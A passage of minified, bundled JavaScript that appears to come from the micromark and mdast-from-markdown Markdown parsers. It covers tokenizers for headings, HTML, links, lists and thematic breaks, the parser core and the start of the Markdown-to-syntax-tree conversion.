a(t){return e.enter(`atxHeadingSequence`),o(t)}function o(t){return t===35&&r++<6?(e.consume(t),o):t===null||dg(t)?(e.exit(`atxHeadingSequence`),s(t)):n(t)}function s(n){return n===35?(e.enter(`atxHeadingSequence`),c(n)):n===null||Z(n)?(e.exit(`atxHeading`),t(n)):Q(n)?$(e,s,`whitespace`)(n):(e.enter(`atxHeadingText`),l(n))}function c(t){return t===35?(e.consume(t),c):(e.exit(`atxHeadingSequence`),s(t))}function l(t){return t===null||t===35||dg(t)?(e.exit(`atxHeadingText`),s(t)):(e.consume(t),l)}}var b_=`address.article.aside.base.basefont.blockquote.body.caption.center.col.colgroup.dd.details.dialog.dir.div.dl.dt.fieldset.figcaption.figure.footer.form.frame.frameset.h1.h2.h3.h4.h5.h6.head.header.hr.html.iframe.legend.li.link.main.menu.menuitem.nav.noframes.ol.optgroup.option.p.param.search.section.summary.table.tbody.td.tfoot.th.thead.title.tr.track.ul`.split(`.`),x_=[`pre`,`script`,`style`,`textarea`],S_={concrete:!0,name:`htmlFlow`,resolveTo:T_,tokenize:E_},C_={partial:!0,tokenize:O_},w_={partial:!0,tokenize:D_};function T_(e){let t=e.length;for(;t--&&!(e[t][0]===`enter`&&e[t][1].type===`htmlFlow`););return t>1&&e[t-2][1].type===`linePrefix`&&(e[t][1].start=e[t-2][1].start,e[t+1][1].start=e[t-2][1].start,e.splice(t-2,2)),e}function E_(e,t,n){let r=this,i,a,o,s,c;return l;function l(e){return u(e)}function u(t){return e.enter(`htmlFlow`),e.enter(`htmlFlowData`),e.consume(t),d}function d(s){return s===33?(e.consume(s),f):s===47?(e.consume(s),a=!0,h):s===63?(e.consume(s),i=3,r.interrupt?t:k):ig(s)?(e.consume(s),o=String.fromCharCode(s),g):n(s)}function f(a){return a===45?(e.consume(a),i=2,p):a===91?(e.consume(a),i=5,s=0,m):ig(a)?(e.consume(a),i=4,r.interrupt?t:k):n(a)}function p(i){return i===45?(e.consume(i),r.interrupt?t:k):n(i)}function m(i){return i===`CDATA[`.charCodeAt(s++)?(e.consume(i),s===6?r.interrupt?t:D:m):n(i)}function h(t){return ig(t)?(e.consume(t),o=String.fromCharCode(t),g):n(t)}function g(s){if(s===null||s===47||s===62||dg(s)){let c=s===47,l=o.toLowerCase();return!c&&!a&&x_.includes(l)?(i=1,r.interrupt?t(s):D(s)):b_.includes(o.toLowerCase())?(i=6,c?(e.consume(s),_):r.interrupt?t(s):D(s)):(i=7,r.interrupt&&!r.parser.lazy[r.now().line]?n(s):a?v(s):y(s))}return s===45||ag(s)?(e.consume(s),o+=String.fromCharCode(s),g):n(s)}function _(i){return i===62?(e.consume(i),r.interrupt?t:D):n(i)}function v(t){return Q(t)?(e.consume(t),v):E(t)}function y(t){return t===47?(e.consume(t),E):t===58||t===95||ig(t)?(e.consume(t),b):Q(t)?(e.consume(t),y):E(t)}function b(t){return t===45||t===46||t===58||t===95||ag(t)?(e.consume(t),b):x(t)}function x(t){return t===61?(e.consume(t),S):Q(t)?(e.consume(t),x):y(t)}function S(t){return t===null||t===60||t===61||t===62||t===96?n(t):t===34||t===39?(e.consume(t),c=t,C):Q(t)?(e.consume(t),S):w(t)}function C(t){return t===c?(e.consume(t),c=null,T):t===null||Z(t)?n(t):(e.consume(t),C)}function w(t){return t===null||t===34||t===39||t===47||t===60||t===61||t===62||t===96||dg(t)?x(t):(e.consume(t),w)}function T(e){return e===47||e===62||Q(e)?y(e):n(e)}function E(t){return t===62?(e.consume(t),ee):n(t)}function ee(t){return t===null||Z(t)?D(t):Q(t)?(e.consume(t),ee):n(t)}function D(t){return t===45&&i===2?(e.consume(t),re):t===60&&i===1?(e.consume(t),ie):t===62&&i===4?(e.consume(t),A):t===63&&i===3?(e.consume(t),k):t===93&&i===5?(e.consume(t),oe):Z(t)&&(i===6||i===7)?(e.exit(`htmlFlowData`),e.check(C_,se,O)(t)):t===null||Z(t)?(e.exit(`htmlFlowData`),O(t)):(e.consume(t),D)}function O(t){return e.check(w_,te,se)(t)}function te(t){return e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),ne}function ne(t){return t===null||Z(t)?O(t):(e.enter(`htmlFlowData`),D(t))}function re(t){return t===45?(e.consume(t),k):D(t)}function ie(t){return t===47?(e.consume(t),o=``,ae):D(t)}function ae(t){if(t===62){let n=o.toLowerCase();return x_.includes(n)?(e.consume(t),A):D(t)}return ig(t)&&o.length<8?(e.consume(t),o+=String.fromCharCode(t),ae):D(t)}function oe(t){return t===93?(e.consume(t),k):D(t)}function k(t){return t===62?(e.consume(t),A):t===45&&i===2?(e.consume(t),k):D(t)}function A(t){return t===null||Z(t)?(e.exit(`htmlFlowData`),se(t)):(e.consume(t),A)}function se(n){return e.exit(`htmlFlow`),t(n)}}function D_(e,t,n){let r=this;return i;function i(t){return Z(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),a):n(t)}function a(e){return r.parser.lazy[r.now().line]?n(e):t(e)}}function O_(e,t,n){return r;function r(r){return e.enter(`lineEnding`),e.consume(r),e.exit(`lineEnding`),e.attempt(Ag,t,n)}}var k_={name:`htmlText`,tokenize:A_};function A_(e,t,n){let r=this,i,a,o;return s;function s(t){return e.enter(`htmlText`),e.enter(`htmlTextData`),e.consume(t),c}function c(t){return t===33?(e.consume(t),l):t===47?(e.consume(t),x):t===63?(e.consume(t),y):ig(t)?(e.consume(t),w):n(t)}function l(t){return t===45?(e.consume(t),u):t===91?(e.consume(t),a=0,m):ig(t)?(e.consume(t),v):n(t)}function u(t){return t===45?(e.consume(t),p):n(t)}function d(t){return t===null?n(t):t===45?(e.consume(t),f):Z(t)?(o=d,ie(t)):(e.consume(t),d)}function f(t){return t===45?(e.consume(t),p):d(t)}function p(e){return e===62?re(e):e===45?f(e):d(e)}function m(t){return t===`CDATA[`.charCodeAt(a++)?(e.consume(t),a===6?h:m):n(t)}function h(t){return t===null?n(t):t===93?(e.consume(t),g):Z(t)?(o=h,ie(t)):(e.consume(t),h)}function g(t){return t===93?(e.consume(t),_):h(t)}function _(t){return t===62?re(t):t===93?(e.consume(t),_):h(t)}function v(t){return t===null||t===62?re(t):Z(t)?(o=v,ie(t)):(e.consume(t),v)}function y(t){return t===null?n(t):t===63?(e.consume(t),b):Z(t)?(o=y,ie(t)):(e.consume(t),y)}function b(e){return e===62?re(e):y(e)}function x(t){return ig(t)?(e.consume(t),S):n(t)}function S(t){return t===45||ag(t)?(e.consume(t),S):C(t)}function C(t){return Z(t)?(o=C,ie(t)):Q(t)?(e.consume(t),C):re(t)}function w(t){return t===45||ag(t)?(e.consume(t),w):t===47||t===62||dg(t)?T(t):n(t)}function T(t){return t===47?(e.consume(t),re):t===58||t===95||ig(t)?(e.consume(t),E):Z(t)?(o=T,ie(t)):Q(t)?(e.consume(t),T):re(t)}function E(t){return t===45||t===46||t===58||t===95||ag(t)?(e.consume(t),E):ee(t)}function ee(t){return t===61?(e.consume(t),D):Z(t)?(o=ee,ie(t)):Q(t)?(e.consume(t),ee):T(t)}function D(t){return t===null||t===60||t===61||t===62||t===96?n(t):t===34||t===39?(e.consume(t),i=t,O):Z(t)?(o=D,ie(t)):Q(t)?(e.consume(t),D):(e.consume(t),te)}function O(t){return t===i?(e.consume(t),i=void 0,ne):t===null?n(t):Z(t)?(o=O,ie(t)):(e.consume(t),O)}function te(t){return t===null||t===34||t===39||t===60||t===61||t===96?n(t):t===47||t===62||dg(t)?T(t):(e.consume(t),te)}function ne(e){return e===47||e===62||dg(e)?T(e):n(e)}function re(r){return r===62?(e.consume(r),e.exit(`htmlTextData`),e.exit(`htmlText`),t):n(r)}function ie(t){return e.exit(`htmlTextData`),e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),ae}function ae(t){return Q(t)?$(e,oe,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):oe(t)}function oe(t){return e.enter(`htmlTextData`),o(t)}}var j_={name:`labelEnd`,resolveAll:F_,resolveTo:I_,tokenize:L_},M_={tokenize:R_},N_={tokenize:z_},P_={tokenize:B_};function F_(e){let t=-1,n=[];for(;++t<e.length;){let r=e[t][1];if(n.push(e[t]),r.type===`labelImage`||r.type===`labelLink`||r.type===`labelEnd`){let e=r.type===`labelImage`?4:2;r.type=`data`,t+=e}}return e.length!==n.length&&Xh(e,0,e.length,n),e}function I_(e,t){let n=e.length,r=0,i,a,o,s;for(;n--;)if(i=e[n][1],a){if(i.type===`link`||i.type===`labelLink`&&i._inactive)break;e[n][0]===`enter`&&i.type===`labelLink`&&(i._inactive=!0)}else if(o){if(e[n][0]===`enter`&&(i.type===`labelImage`||i.type===`labelLink`)&&!i._balanced&&(a=n,i.type!==`labelLink`)){r=2;break}}else i.type===`labelEnd`&&(o=n);let c={type:e[a][1].type===`labelLink`?`link`:`image`,start:{...e[a][1].start},end:{...e[e.length-1][1].end}},l={type:`label`,start:{...e[a][1].start},end:{...e[o][1].end}},u={type:`labelText`,start:{...e[a+r+2][1].end},end:{...e[o-2][1].start}};return s=[[`enter`,c,t],[`enter`,l,t]],s=Zh(s,e.slice(a+1,a+r+3)),s=Zh(s,[[`enter`,u,t]]),s=Zh(s,Cg(t.parser.constructs.insideSpan.null,e.slice(a+r+4,o-3),t)),s=Zh(s,[[`exit`,u,t],e[o-2],e[o-1],[`exit`,l,t]]),s=Zh(s,e.slice(o+1)),s=Zh(s,[[`exit`,c,t]]),Xh(e,a,e.length,s),e}function L_(e,t,n){let r=this,i=r.events.length,a,o;for(;i--;)if((r.events[i][1].type===`labelImage`||r.events[i][1].type===`labelLink`)&&!r.events[i][1]._balanced){a=r.events[i][1];break}return s;function s(t){return a?a._inactive?d(t):(o=r.parser.defined.includes(rg(r.sliceSerialize({start:a.end,end:r.now()}))),e.enter(`labelEnd`),e.enter(`labelMarker`),e.consume(t),e.exit(`labelMarker`),e.exit(`labelEnd`),c):n(t)}function c(t){return t===40?e.attempt(M_,u,o?u:d)(t):t===91?e.attempt(N_,u,o?l:d)(t):o?u(t):d(t)}function l(t){return e.attempt(P_,u,d)(t)}function u(e){return t(e)}function d(e){return a._balanced=!0,n(e)}}function R_(e,t,n){return r;function r(t){return e.enter(`resource`),e.enter(`resourceMarker`),e.consume(t),e.exit(`resourceMarker`),i}function i(t){return dg(t)?u_(e,a)(t):a(t)}function a(t){return t===41?u(t):s_(e,o,s,`resourceDestination`,`resourceDestinationLiteral`,`resourceDestinationLiteralMarker`,`resourceDestinationRaw`,`resourceDestinationString`,32)(t)}function o(t){return dg(t)?u_(e,c)(t):u(t)}function s(e){return n(e)}function c(t){return t===34||t===39||t===40?l_(e,l,n,`resourceTitle`,`resourceTitleMarker`,`resourceTitleString`)(t):u(t)}function l(t){return dg(t)?u_(e,u)(t):u(t)}function u(r){return r===41?(e.enter(`resourceMarker`),e.consume(r),e.exit(`resourceMarker`),e.exit(`resource`),t):n(r)}}function z_(e,t,n){let r=this;return i;function i(t){return c_.call(r,e,a,o,`reference`,`referenceMarker`,`referenceString`)(t)}function a(e){return r.parser.defined.includes(rg(r.sliceSerialize(r.events[r.events.length-1][1]).slice(1,-1)))?t(e):n(e)}function o(e){return n(e)}}function B_(e,t,n){return r;function r(t){return e.enter(`reference`),e.enter(`referenceMarker`),e.consume(t),e.exit(`referenceMarker`),i}function i(r){return r===93?(e.enter(`referenceMarker`),e.consume(r),e.exit(`referenceMarker`),e.exit(`reference`),t):n(r)}}var V_={name:`labelStartImage`,resolveAll:j_.resolveAll,tokenize:H_};function H_(e,t,n){let r=this;return i;function i(t){return e.enter(`labelImage`),e.enter(`labelImageMarker`),e.consume(t),e.exit(`labelImageMarker`),a}function a(t){return t===91?(e.enter(`labelMarker`),e.consume(t),e.exit(`labelMarker`),e.exit(`labelImage`),o):n(t)}function o(e){return e===94&&`_hiddenFootnoteSupport`in r.parser.constructs?n(e):t(e)}}var U_={name:`labelStartLink`,resolveAll:j_.resolveAll,tokenize:W_};function W_(e,t,n){let r=this;return i;function i(t){return e.enter(`labelLink`),e.enter(`labelMarker`),e.consume(t),e.exit(`labelMarker`),e.exit(`labelLink`),a}function a(e){return e===94&&`_hiddenFootnoteSupport`in r.parser.constructs?n(e):t(e)}}var G_={name:`lineEnding`,tokenize:K_};function K_(e,t){return n;function n(n){return e.enter(`lineEnding`),e.consume(n),e.exit(`lineEnding`),$(e,t,`linePrefix`)}}var q_={name:`thematicBreak`,tokenize:J_};function J_(e,t,n){let r=0,i;return a;function a(t){return e.enter(`thematicBreak`),o(t)}function o(e){return i=e,s(e)}function s(a){return a===i?(e.enter(`thematicBreakSequence`),c(a)):r>=3&&(a===null||Z(a))?(e.exit(`thematicBreak`),t(a)):n(a)}function c(t){return t===i?(e.consume(t),r++,c):(e.exit(`thematicBreakSequence`),Q(t)?$(e,s,`whitespace`)(t):s(t))}}var Y_={continuation:{tokenize:$_},exit:tv,name:`list`,tokenize:Q_},X_={partial:!0,tokenize:nv},Z_={partial:!0,tokenize:ev};function Q_(e,t,n){let r=this,i=r.events[r.events.length-1],a=i&&i[1].type===`linePrefix`?i[2].sliceSerialize(i[1],!0).length:0,o=0;return s;function s(t){let i=r.containerState.type||(t===42||t===43||t===45?`listUnordered`:`listOrdered`);if(i===`listUnordered`?!r.containerState.marker||t===r.containerState.marker:cg(t)){if(r.containerState.type||(r.containerState.type=i,e.enter(i,{_container:!0})),i===`listUnordered`)return e.enter(`listItemPrefix`),t===42||t===45?e.check(q_,n,l)(t):l(t);if(!r.interrupt||t===49)return e.enter(`listItemPrefix`),e.enter(`listItemValue`),c(t)}return n(t)}function c(t){return cg(t)&&++o<10?(e.consume(t),c):(!r.interrupt||o<2)&&(r.containerState.marker?t===r.containerState.marker:t===41||t===46)?(e.exit(`listItemValue`),l(t)):n(t)}function l(t){return e.enter(`listItemMarker`),e.consume(t),e.exit(`listItemMarker`),r.containerState.marker=r.containerState.marker||t,e.check(Ag,r.interrupt?n:u,e.attempt(X_,f,d))}function u(e){return r.containerState.initialBlankLine=!0,a++,f(e)}function d(t){return Q(t)?(e.enter(`listItemPrefixWhitespace`),e.consume(t),e.exit(`listItemPrefixWhitespace`),f):n(t)}function f(n){return r.containerState.size=a+r.sliceSerialize(e.exit(`listItemPrefix`),!0).length,t(n)}}function $_(e,t,n){let r=this;return r.containerState._closeFlow=void 0,e.check(Ag,i,a);function i(n){return r.containerState.furtherBlankLines=r.containerState.furtherBlankLines||r.containerState.initialBlankLine,$(e,t,`listItemIndent`,r.containerState.size+1)(n)}function a(n){return r.containerState.furtherBlankLines||!Q(n)?(r.containerState.furtherBlankLines=void 0,r.containerState.initialBlankLine=void 0,o(n)):(r.containerState.furtherBlankLines=void 0,r.containerState.initialBlankLine=void 0,e.attempt(Z_,t,o)(n))}function o(i){return r.containerState._closeFlow=!0,r.interrupt=void 0,$(e,e.attempt(Y_,t,n),`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(i)}}function ev(e,t,n){let r=this;return $(e,i,`listItemIndent`,r.containerState.size+1);function i(e){let i=r.events[r.events.length-1];return i&&i[1].type===`listItemIndent`&&i[2].sliceSerialize(i[1],!0).length===r.containerState.size?t(e):n(e)}}function tv(e){e.exit(this.containerState.type)}function nv(e,t,n){let r=this;return $(e,i,`listItemPrefixWhitespace`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:5);function i(e){let i=r.events[r.events.length-1];return!Q(e)&&i&&i[1].type===`listItemPrefixWhitespace`?t(e):n(e)}}var rv={name:`setextUnderline`,resolveTo:iv,tokenize:av};function iv(e,t){let n=e.length,r,i,a;for(;n--;)if(e[n][0]===`enter`){if(e[n][1].type===`content`){r=n;break}e[n][1].type===`paragraph`&&(i=n)}else e[n][1].type===`content`&&e.splice(n,1),!a&&e[n][1].type===`definition`&&(a=n);let o={type:`setextHeading`,start:{...e[r][1].start},end:{...e[e.length-1][1].end}};return e[i][1].type=`setextHeadingText`,a?(e.splice(i,0,[`enter`,o,t]),e.splice(a+1,0,[`exit`,e[r][1],t]),e[r][1].end={...e[a][1].end}):e[r][1]=o,e.push([`exit`,o,t]),e}function av(e,t,n){let r=this,i;return a;function a(t){let a=r.events.length,s;for(;a--;)if(r.events[a][1].type!==`lineEnding`&&r.events[a][1].type!==`linePrefix`&&r.events[a][1].type!==`content`){s=r.events[a][1].type===`paragraph`;break}return!r.parser.lazy[r.now().line]&&(r.interrupt||s)?(e.enter(`setextHeadingLine`),i=t,o(t)):n(t)}function o(t){return e.enter(`setextHeadingLineSequence`),s(t)}function s(t){return t===i?(e.consume(t),s):(e.exit(`setextHeadingLineSequence`),Q(t)?$(e,c,`lineSuffix`)(t):c(t))}function c(r){return r===null||Z(r)?(e.exit(`setextHeadingLine`),t(r)):n(r)}}var ov={tokenize:sv};function sv(e){let t=this,n=e.attempt(Ag,r,e.attempt(this.parser.constructs.flowInitial,i,$(e,e.attempt(this.parser.constructs.flow,i,e.attempt(n_,i)),`linePrefix`)));return n;function r(r){if(r===null){e.consume(r);return}return e.enter(`lineEndingBlank`),e.consume(r),e.exit(`lineEndingBlank`),t.currentConstruct=void 0,n}function i(r){if(r===null){e.consume(r);return}return e.enter(`lineEnding`),e.consume(r),e.exit(`lineEnding`),t.currentConstruct=void 0,n}}var cv={resolveAll:fv()},lv=dv(`string`),uv=dv(`text`);function dv(e){return{resolveAll:fv(e===`text`?pv:void 0),tokenize:t};function t(t){let n=this,r=this.parser.constructs[e],i=t.attempt(r,a,o);return a;function a(e){return c(e)?i(e):o(e)}function o(e){if(e===null){t.consume(e);return}return t.enter(`data`),t.consume(e),s}function s(e){return c(e)?(t.exit(`data`),i(e)):(t.consume(e),s)}function c(e){if(e===null)return!0;let t=r[e],i=-1;if(t)for(;++i<t.length;){let e=t[i];if(!e.previous||e.previous.call(n,n.previous))return!0}return!1}}}function fv(e){return t;function t(t,n){let r=-1,i;for(;++r<=t.length;)i===void 0?t[r]&&t[r][1].type===`data`&&(i=r,r++):(!t[r]||t[r][1].type!==`data`)&&(r!==i+2&&(t[i][1].end=t[r-1][1].end,t.splice(i+2,r-i-2),r=i+2),i=void 0);return e?e(t,n):t}}function pv(e,t){let n=0;for(;++n<=e.length;)if((n===e.length||e[n][1].type===`lineEnding`)&&e[n-1][1].type===`data`){let r=e[n-1][1],i=t.sliceStream(r),a=i.length,o=-1,s=0,c;for(;a--;){let e=i[a];if(typeof e==`string`){for(o=e.length;e.charCodeAt(o-1)===32;)s++,o--;if(o)break;o=-1}else if(e===-2)c=!0,s++;else if(e!==-1){a++;break}}if(t._contentTypeTextTrailing&&n===e.length&&(s=0),s){let i={type:n===e.length||c||s<2?`lineSuffix`:`hardBreakTrailing`,start:{_bufferIndex:a?o:r.start._bufferIndex+o,_index:r.start._index+a,line:r.end.line,column:r.end.column-s,offset:r.end.offset-s},end:{...r.end}};r.end={...i.start},r.start.offset===r.end.offset?Object.assign(r,i):(e.splice(n,0,[`enter`,i,t],[`exit`,i,t]),n+=2)}n++}return e}var mv=c({attentionMarkers:()=>Sv,contentInitial:()=>gv,disable:()=>Cv,document:()=>hv,flow:()=>vv,flowInitial:()=>_v,insideSpan:()=>xv,string:()=>yv,text:()=>bv}),hv={42:Y_,43:Y_,45:Y_,48:Y_,49:Y_,50:Y_,51:Y_,52:Y_,53:Y_,54:Y_,55:Y_,56:Y_,57:Y_,62:Mg},gv={91:d_},_v={[-2]:Wg,[-1]:Wg,32:Wg},vv={35:__,42:q_,45:[rv,q_],60:S_,61:rv,95:q_,96:Vg,126:Vg},yv={38:Rg,92:Ig},bv={[-5]:G_,[-4]:G_,[-3]:G_,33:V_,38:Rg,42:wg,60:[Og,k_],91:U_,92:[h_,Ig],93:j_,95:wg,96:Jg},xv={null:[wg,cv]},Sv={null:[42,95]},Cv={null:[]};function wv(e,t,n){let r={_bufferIndex:-1,_index:0,line:n&&n.line||1,column:n&&n.column||1,offset:n&&n.offset||0},i={},a=[],o=[],s=[],c={attempt:C(x),check:C(S),consume:v,enter:y,exit:b,interrupt:C(S,{interrupt:!0})},l={code:null,containerState:{},defineSkip:h,events:[],now:m,parser:e,previous:null,sliceSerialize:f,sliceStream:p,write:d},u=t.tokenize.call(l,c);return t.resolveAll&&a.push(t),l;function d(e){return o=Zh(o,e),g(),o[o.length-1]===null?(w(t,0),l.events=Cg(a,l.events,l),l.events):[]}function f(e,t){return Ev(p(e),t)}function p(e){return Tv(o,e)}function m(){let{_bufferIndex:e,_index:t,line:n,column:i,offset:a}=r;return{_bufferIndex:e,_index:t,line:n,column:i,offset:a}}function h(e){i[e.line]=e.column,E()}function g(){let e;for(;r._index<o.length;){let t=o[r._index];if(typeof t==`string`)for(e=r._index,r._bufferIndex<0&&(r._bufferIndex=0);r._index===e&&r._bufferIndex<t.length;)_(t.charCodeAt(r._bufferIndex));else _(t)}}function _(e){u=u(e)}function v(e){Z(e)?(r.line++,r.column=1,r.offset+=e===-3?2:1,E()):e!==-1&&(r.column++,r.offset++),r._bufferIndex<0?r._index++:(r._bufferIndex++,r._bufferIndex===o[r._index].length&&(r._bufferIndex=-1,r._index++)),l.previous=e}function y(e,t){let n=t||{};return n.type=e,n.start=m(),l.events.push([`enter`,n,l]),s.push(n),n}function b(e){let t=s.pop();return t.end=m(),l.events.push([`exit`,t,l]),t}function x(e,t){w(e,t.from)}function S(e,t){t.restore()}function C(e,t){return n;function n(n,r,i){let a,o,s,u;return Array.isArray(n)?f(n):`tokenize`in n?f([n]):d(n);function d(e){return t;function t(t){let n=t!==null&&e[t],r=t!==null&&e.null;return f([...Array.isArray(n)?n:n?[n]:[],...Array.isArray(r)?r:r?[r]:[]])(t)}}function f(e){return a=e,o=0,e.length===0?i:p(e[o])}function p(e){return n;function n(n){return u=T(),s=e,e.partial||(l.currentConstruct=e),e.name&&l.parser.constructs.disable.null.includes(e.name)?h(n):e.tokenize.call(t?Object.assign(Object.create(l),t):l,c,m,h)(n)}}function m(t){return e(s,u),r}function h(e){return u.restore(),++o<a.length?p(a[o]):i}}}function w(e,t){e.resolveAll&&!a.includes(e)&&a.push(e),e.resolve&&Xh(l.events,t,l.events.length-t,e.resolve(l.events.slice(t),l)),e.resolveTo&&(l.events=e.resolveTo(l.events,l))}function T(){let e=m(),t=l.previous,n=l.currentConstruct,i=l.events.length,a=Array.from(s);return{from:i,restore:o};function o(){r=e,l.previous=t,l.currentConstruct=n,l.events.length=i,s=a,E()}}function E(){r.line in i&&r.column<2&&(r.column=i[r.line],r.offset+=i[r.line]-1)}}function Tv(e,t){let n=t.start._index,r=t.start._bufferIndex,i=t.end._index,a=t.end._bufferIndex,o;if(n===i)o=[e[n].slice(r,a)];else{if(o=e.slice(n,i),r>-1){let e=o[0];typeof e==`string`?o[0]=e.slice(r):o.shift()}a>0&&o.push(e[i].slice(0,a))}return o}function Ev(e,t){let n=-1,r=[],i;for(;++n<e.length;){let a=e[n],o;if(typeof a==`string`)o=a;else switch(a){case-5:o=`\r`;break;case-4:o=`
`;break;case-3:o=`\r
`;break;case-2:o=t?` `:`	`;break;case-1:if(!t&&i)continue;o=` `;break;default:o=String.fromCharCode(a)}i=a===-2,r.push(o)}return r.join(``)}function Dv(e){let t={constructs:$h([mv,...(e||{}).extensions||[]]),content:n(gg),defined:[],document:n(vg),flow:n(ov),lazy:{},string:n(lv),text:n(uv)};return t;function n(e){return n;function n(n){return wv(t,e,n)}}}function Ov(e){for(;!e_(e););return e}var kv=/[\0\t\n\r]/g;function Av(){let e=1,t=``,n=!0,r;return i;function i(i,a,o){let s=[],c,l,u,d,f;for(i=t+(typeof i==`string`?i.toString():new TextDecoder(a||void 0).decode(i)),u=0,t=``,n&&=(i.charCodeAt(0)===65279&&u++,void 0);u<i.length;){if(kv.lastIndex=u,c=kv.exec(i),d=c&&c.index!==void 0?c.index:i.length,f=i.charCodeAt(d),!c){t=i.slice(u);break}if(f===10&&u===d&&r)s.push(-3),r=void 0;else switch(r&&=(s.push(-5),void 0),u<d&&(s.push(i.slice(u,d)),e+=d-u),f){case 0:s.push(65533),e++;break;case 9:for(l=Math.ceil(e/4)*4,s.push(-2);e++<l;)s.push(-1);break;case 10:s.push(-4),e=1;break;default:r=!0,e=1}u=d+1}return o&&(r&&s.push(-5),t&&s.push(t),s.push(null)),s}}var jv=/\\([!-/:-@[-`{-~])|&(#(?:\d{1,7}|x[\da-f]{1,6})|[\da-z]{1,31});/gi;function Mv(e){return e.replace(jv,Nv)}function Nv(e,t,n){if(t)return t;if(n.charCodeAt(0)===35){let e=n.charCodeAt(1),t=e===120||e===88;return ng(n.slice(t?2:1),t?16:10)}return Yh(n)||e}var Pv={}.hasOwnProperty;function Fv(e,t,n){return t&&typeof t==`object`&&(n=t,t=void 0),Iv(n)(Ov(Dv(n).document().write(Av()(e,t,!0))))}function Iv(e){let t={transforms:[],canContainEols:[`emphasis`,`fragment`,`heading`,`paragraph`,`strong`],enter:{autolink:a(we),autolinkProtocol:T,autolinkEmail:T,atxHeading:a(be),blockQuote:a(he),characterEscape:T,characterReference:T,codeFenced:a(ge),codeFencedFenceInfo:o,codeFencedFenceMeta:o,codeIndented:a(ge,o),codeText:a(_e,o),codeTextData:T,data:T,codeFlowValue:T,definition:a(ve),definitionDestinationString:o,definitionLabelString:o,definitionTitleString:o,emphasis:a(ye),hardBreakEscape:a(xe),hardBreakTrailing:a(xe),htmlFlow:a(Se,o),htmlFlowData:T,htmlText:a(Se,o),htmlTextData:T,image:a(Ce),label:o,link:a(we),listItem:a(Ee),listItemValue:f,listOrdered:a(Te,d),listUnordered:a(Te),paragraph:a(De),reference:ce,referenceString:o,resourceDestinationString:o,resourceTitleString:o,setextHeading:a(be),strong:a(Oe),thematicBreak:a(Ae)},exit:{atxHeading:c(),atxHeadingSequence:x,autolink:c(),autolinkEmail:me,autolinkProtocol:pe,blockQuote:c(),characterEscapeValue:E,characterReferenceMarkerHexadecimal:ue,characterReferenceMarkerNumeric:ue,characterReferenceValue:de,characterReference:fe,codeFenced:c(g),codeFencedFence:h,codeFencedFenceInfo:p,codeFencedFenceMeta:m,codeFlowValue:E,codeIndented:c(_),codeText:c(ne),codeTextData:E,data:E,definition:c(),definitionDestinationString:b,definitionLabelString:v,definitionTitleString:y,emphasis:c(),hardBreakEscape:c(D),hardBreakTrailing:c(D),htmlFlow:c(O),htmlFlowData:E,htmlText:c(te),htmlTextData:E,image:c(ie),label:oe,labelText:ae,lineEnding:ee,link:c(re),listItem:c(),listOrdered:c(),listUnordered:c(),paragraph:c(),referenceString:le,resourceDestinationString:k,resourceTitleString:A,resource:se,setextHeading:c(w),setextHeadingLineSequence:C,setextHeadingText:S,strong:c(),thematicBreak:c()}};Rv(t,(e||{}).mdastExtensions||[]);let n={};return r;function r(e){let r={type:`root`,children:[]},a={stack:[r],tokenStack:[],config:t,enter:s,exit:l,buffer:o,resume:u,data:n},c=[],d=-1;for(;++d<e.length;)(e[d][1].type===`listOrdered`||e[d][1].type===`listUnordered`)&&(e[d][0]===`enter`?c.push(d):d=i(e,c.pop(),d));for(d=-1;++d<e.length;){let n=t[e[d][0]];Pv.call(n,e[d][1].type)&&n[e[d][1].type].call(Object.assign({sliceSerialize:e[d][2].sliceSerialize},a),e[d][1])}if(a.tokenStack.length>0){let e=a.tokenStack[a.tokenStack.length-1];(e[1]||Bv).call(a,void 0,e[0])}for(r.position={start:Lv(e.length>0?e[0][1].start:{line:1,column:1,offset:0}),end:Lv(e.length>0?e[e.length-2][1].end:{line:1,column:1,offset:0})},d=-1;++d<t.transforms.length;)r=t.transforms[d](r)||r;return r}function i(e,t,n){let r=t-1,i=-1,a=!1,o,s,c,l;for(;++r<=n;){let t=e[r];switch(t[1].type){case`listUnordered`:case`listOrdered`:case`blockQuote`:t[0]===`enter`?i++:i--,l=void 0;break;case`lineEndingBlank`:t[0]===`enter`&&(o&&!l&&!i&&!c&&(c=r),l=void 0);break;case`linePrefix`:case`listItemValue`:case`listItemMarker`:case`listItemPrefix`:case`listItemPrefixWhitespace`:break;default:l=void 0}if(!i&&t[0]===`enter`&&t[1].type===`listItemPrefix`||i===-1&&t[0]===`exit`&&(t[1].type===`listUnordered`||t[1].type===`listOrdered`)){if(o){let i=r;for(s=void 0;i--;){let t=e[i];if(t[1].type===`lineEnding`||t[1].type===`lineEndingBlank`){if(t[0]===`exit`)continue;s&&(e[s][1].type=`lineEndingBlank`,a=!0),t[1].type=`lineEnding`,s=i}else if(!(t[1].type===`linePrefix`||t[1].type===`blockQuotePrefix`||t[1].type===`blockQuotePrefixWhitespace`||t[1].type===`blockQuoteMarker`||t[1].type===`listItemIndent`))break}c&&(!s||c<s)&&(o._spread=!0),o.end=Object.assign({},s?e[s][1].start:t[1].end),e.splice(s||r,0,[`exit`,o,t[2]]),r++,n++}if(t[1].type===`listItemPrefix`){let i={type:`listItem`,_spread:!1,start:Object.assign({},t[1].start),end:void 0};o=i,e.splice(r,0,[`enter`,i,t[2]]),r++,n++,c=void 0,l=!0}}}return e[t][1]._spread=a,n}function a(e,t){return n;function n(n){s.call(this,e(n),n),t&&t.call(this,n)}}function o(){this.stack.push({type:`fragment`,children:[]})}function s(e,t,n){this.stack[this.stack.length-1].children.push(e),this.stack.push(e),this.tokenStack.push([t,n||void 0]),e.position={start:Lv(t.start),end:void 0}}function c(e){return t;function t(t){e&&e.call(this,t),l.call(this,t)}}function l(e,t){let n=this.stack.pop(),r=this.tokenStack.pop();if(r)r[0].type!==e.type&&(t?t.call(this,e,r[0]):(r[1]||Bv).call(this,e,r[0]));else throw Error("Cannot close `"+e.type+"` ("+ch({start:e.start,end:e.end})+`): it’s not open`);n.position.end=Lv(e.end)}function u(){return Wh(this.stack.pop())}function d(){this.data.expectingFirstListItemValue=!0}function f(e){if(this.data.expectingFirstListItemValue){let 